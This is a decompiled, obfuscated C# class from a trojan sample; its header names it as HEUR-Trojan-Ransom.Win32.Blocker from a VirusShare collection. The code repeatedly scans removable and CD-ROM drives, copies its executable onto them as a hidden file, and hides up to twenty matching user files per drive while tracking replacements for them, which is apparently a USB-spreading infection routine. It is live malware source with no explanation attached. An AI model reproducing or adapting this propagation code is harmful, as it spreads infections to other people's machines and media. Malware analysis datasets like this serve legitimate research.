// Decompiled with JetBrains decompiler
// Type: .
// Assembly: w, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8101C3F8-A792-4EB9-952B-26F7AB9A4B5A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.Win32.Blocker.vho-bc21886ff5fa061490673a734a0fae648503560d8ff26be6ac862202b96b7ef0.exe

using \u0003;
using \u0004;
using \u0006;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace \u0003
{
  internal class \u0002
  {
    internal bool \u0001;
    internal Thread \u0001;
    public string \u0001;
    public Collection \u0001;
    [NonSerialized]
    internal static \u0001 \u000E;

    public \u0002()
    {
      try
      {
        this.\u0001 = false;
        this.\u0001 = (Thread) null;
        this.\u0001 = new Collection();
      }
      catch (Exception ex)
      {
        \u0007.\u0001(ex, (object) this);
        throw;
      }
    }

    public unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      DriveInfo[] driveInfoArray1;
      DriveInfo driveInfo;
      \u0002.\u0001 obj;
      string[] strArray;
      string fileName;
      Exception exception1;
      Exception exception2;
      Exception exception3;
      try
      {
        this.\u0001 = (Thread) null;
        if (true)
          \u0007.\u0001(this);
        this.\u0001 = \u0082.\u007F\u0002();
        this.\u0001 = false;
        while (!this.\u0001)
        {
          try
          {
            DriveInfo[] driveInfoArray2 = \u0083.\u0080\u0002();
            if (true)
              goto label_34;
label_3:
            if (true)
            {
              *(int*) voidPtr = 0;
              while (*(int*) voidPtr < driveInfoArray1.Length)
              {
                driveInfo = driveInfoArray1[*(int*) voidPtr];
                if (!\u0015.\u007E\u007F((object) this.\u0001, \u001E.\u007E\u009C((object) \u001E.\u007E\u009D((object) driveInfo))))
                {
                  obj = new \u0002.\u0001();
                  obj.\u0001 = \u001E.\u007E\u009D((object) driveInfo);
                  \u0084.\u007E\u0081\u0002((object) this.\u0001, (object) obj, \u001E.\u007E\u009C((object) \u001E.\u007E\u009D((object) driveInfo)), (object) null, (object) null);
                }
                else
                  obj = (\u0002.\u0001) \u0086.\u007E\u0082\u0002((object) this.\u0001, \u001E.\u007E\u009C((object) \u001E.\u007E\u009D((object) driveInfo)));
                if (!this.\u0001)
                {
                  try
                  {
                    while (\u0087.\u007E\u0084\u0002((object) driveInfo))
                    {
                      if (true)
                      {
                        if (\u0088.\u007E\u0097\u0002((object) driveInfo) > 0L & \u0089.\u007E\u009A\u0002((object) driveInfo) == DriveType.Removable | \u0089.\u007E\u009A\u0002((object) driveInfo) == DriveType.CDRom)
                        {
                          try
                          {
                            if (!\u008A.\u009B\u0002(\u001D.\u0099(\u001E.\u007E\u009D((object) driveInfo), this.\u0001)))
                            {
                              \u008C.\u0003\u0003(\u008B.\u009D\u0002(), \u001D.\u0099(\u001E.\u007E\u009D((object) driveInfo), this.\u0001), true);
                              \u008D.\u0004\u0003(\u001D.\u0099(\u001E.\u007E\u009D((object) driveInfo), this.\u0001), FileAttributes.Hidden);
                            }
                            strArray = \u008E.\u0005\u0003(\u001E.\u007E\u009D((object) driveInfo));
                            *(int*) ((IntPtr) voidPtr + 4) = 0;
                            while (*(int*) ((IntPtr) voidPtr + 4) < strArray.Length)
                            {
                              fileName = strArray[*(int*) ((IntPtr) voidPtr + 4)];
                              int num1 = \u001C.\u0098(\u001E.\u007E\u009C((object) \u007F.\u001A\u0002(fileName)), \u0002.\u000E(681), false) != 0 ? 1 : 0;
                              int num2 = \u001C.\u0098(\u001E.\u007E\u009C((object) fileName), \u001D.\u0099(\u001E.\u007E\u009C((object) \u001E.\u007E\u009D((object) driveInfo)), \u001E.\u007E\u009C((object) this.\u0001)), false) != 0 ? 1 : 0;
                              if (true)
                              {
                                if ((num1 & num2) != 0)
                                {
                                  if (!obj.\u0001.Contains(\u001E.\u007E\u009E((object) new FileInfo(fileName))))
                                  {
                                    if (obj.\u0001.Count < 20)
                                    {
                                      \u0007.\u0001(\u0007.\u0001(this, \u007F.\u001A\u0002(fileName)), driveInfo, this, fileName);
                                      obj.\u0001.Add(\u001E.\u007E\u009E((object) new FileInfo(fileName)));
                                      \u008D.\u0004\u0003(fileName, FileAttributes.Hidden);
                                      obj.\u0002.Add(\u007F.\u0019\u0002(global::\u0004.\u0004(\u001E.\u007E\u009D((object) driveInfo), \u001E.\u007E\u009E((object) new FileInfo(fileName)), \u0002.\u000E(681))));
                                      goto label_28;
                                    }
                                    else
                                      goto label_28;
                                  }
                                  else if (obj.\u0001.Contains(\u001E.\u007E\u009E((object) new FileInfo(fileName))))
                                  {
                                    if (\u008F.\u0007\u0003(fileName) != FileAttributes.Hidden)
                                      \u008D.\u0004\u0003(fileName, FileAttributes.Hidden);
                                    if (!\u008A.\u009B\u0002(global::\u0004.\u0004(\u001E.\u007E\u009D((object) driveInfo), \u001E.\u007E\u009E((object) new FileInfo(fileName)), \u0002.\u000E(681))))
                                    {
                                      \u0007.\u0001(\u0007.\u0001(this, \u007F.\u001A\u0002(fileName)), driveInfo, this, fileName);
                                      goto label_28;
                                    }
                                    else
                                    {
                                      int num3 = \u001C.\u0098(\u007F.\u0019\u0002(global::\u0004.\u0004(\u001E.\u007E\u009D((object) driveInfo), \u001E.\u007E\u009E((object) new FileInfo(fileName)), \u0002.\u000E(681))), obj.\u0002[obj.\u0001.IndexOf(\u001E.\u007E\u009E((object) new FileInfo(fileName)))], false);
                                      num2 = 0;
                                      num1 = num3;
                                    }
                                  }
                                  else
                                    goto label_28;
                                }
                                else
                                  goto label_28;
                              }
                              if (num1 != num2)
                                \u0007.\u0001(\u0007.\u0001(this, \u007F.\u001A\u0002(fileName)), driveInfo, this, fileName);
label_28:
                              *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
                            }
                            break;
                          }
                          catch (Exception ex)
                          {
                            ProjectData.SetProjectError(ex);
                            exception1 = ex;
                            global::\u0006.\u0006();
                            break;
                          }
                        }
                        else
                          break;
                      }
                    }
                  }
                  catch (Exception ex)
                  {
                    ProjectData.SetProjectError(ex);
                    exception2 = ex;
                    global::\u0006.\u0006();
                  }
                  *(int*) voidPtr = checked (*(int*) voidPtr + 1);
                }
                else
                  goto label_38;
              }
              goto label_36;
            }
            else
              goto label_36;
label_34:
            driveInfoArray1 = driveInfoArray2;
            goto label_3;
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            exception3 = ex;
            global::\u0006.\u0006();
          }
label_36:
          \u001A.\u0095(3000);
        }
label_38:
        this.\u0001 = (Thread) null;
      }
      catch (Exception ex)
      {
        object[] objArray = new object[11]
        {
          (object) obj,
          (object) driveInfo,
          (object) fileName,
          (object) exception1,
          (object) exception2,
          (object) exception3,
          (object) *(int*) voidPtr,
          (object) driveInfoArray1,
          (object) *(int*) ((IntPtr) voidPtr + 4),
          (object) strArray,
          (object) this
        };
        \u0007.\u0001(ex, objArray);
        throw;
      }
    }

    static \u0002() => \u0002.\u0001(typeof (\u0002));

    public class \u0001
    {
      public string \u0001;
      public List<string> \u0001;
      public List<string> \u0002;

      public \u0001()
      {
        try
        {
          this.\u0001 = new List<string>();
          this.\u0002 = new List<string>();
        }
        catch (Exception ex)
        {
          \u0007.\u0001(ex, (object) this);
          throw;
        }
      }
    }
  }
}
